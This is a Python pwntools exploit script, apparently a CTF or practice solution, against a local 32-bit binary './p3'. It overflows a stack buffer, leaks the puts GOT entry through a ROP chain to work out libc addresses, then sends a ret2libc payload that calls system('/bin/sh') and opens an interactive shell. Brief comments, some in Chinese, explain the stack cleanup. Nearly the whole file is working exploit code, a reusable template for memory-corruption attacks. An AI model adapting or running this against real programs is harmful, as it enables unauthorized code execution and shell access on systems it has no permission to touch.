#encoding:utf-8
from pwn import *
from time import sleep
#file :            32bit dyna
#checksec :    nx
fpath = "./p3"
libcpath = '/lib/i386-linux-gnu/libc.so.6'
offset = 22#util ebp      

p = process(fpath)
elf = ELF(fpath)
libc=ELF(libcpath)
#leak32 
addr_puts = elf.plt["puts"]
addr_start = elf.sym["main"]
fill = lambda x: "a" * x
 
def leak32(addres):
    addr_pr = 0x08048339   #清除传入的参数 恢复栈平衡 pop ret
    payload = fill(offset) + p32(addr_puts) + p32(addr_pr) + p32(addres) + p32(addr_start)  
    p.sendline(payload)
    sleep(0.2)
    p.recv(len(payload) + 1) # 清除 原本逻辑中 puts 的输出  
    data        = p.recv(4)      # 目标数据
    log.info("%#x => %s" % (addres, (data or '').encode('hex')))
    p.recv()  #清除 leak 时因为puts 无法控制输出长度造成的多余输出
    return data   
                 
if __name__ == '__main__':
    # libc offset
    offset_bin_sh   = libc.search("/bin/sh").next()
    offset_system   = libc.sym["system"]
    offset_puts     = libc.sym["puts"]
    # p3 addr
    addr_puts_got   = elf.got["puts"]
    addr_puts       = u32(leak32(addr_puts_got))
    # addr_puts - offset_puts = addr_sys - offset_
    addr_sys        = addr_puts + (offset_system - offset_puts)
    addr_bin_sh     = addr_puts + (offset_bin_sh - offset_puts)
    #payload 
    payload         = fill(offset) + p32(addr_sys) + p32(addr_start) + p32(addr_bin_sh) # system("/bin/sh")
    p.sendline(payload)
    p.recv()        # clear
    # getshell
    p.interactive() 